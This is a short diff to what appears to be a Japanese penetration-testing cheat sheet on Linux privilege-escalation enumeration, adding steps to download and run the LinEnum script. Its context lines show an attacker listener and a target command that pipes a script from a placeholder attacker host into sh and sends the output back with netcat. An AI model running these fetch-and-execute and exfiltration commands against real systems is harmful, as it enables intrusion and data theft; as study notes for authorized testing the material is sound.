@@ -42,6 +42,15 @@ nc -lvnp 9002 | tee linpeas.out #Attacker
 curl <AttackerIP>:8888/linpeas.sh | sh | nc -q 0 <AttackerIP> 9002 #Target
 ```
 
+LinEnum
+```sh
+# ダウンロード
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/refs/heads/master/LinEnum.sh
+
+# 実行
+./LinEnum.sh -k password -r linenum.out -e /tmp/ -t
+```
+
 ### 補足：結果の見方
 
 - unusual, unknown, unexpectedなどを見逃さない
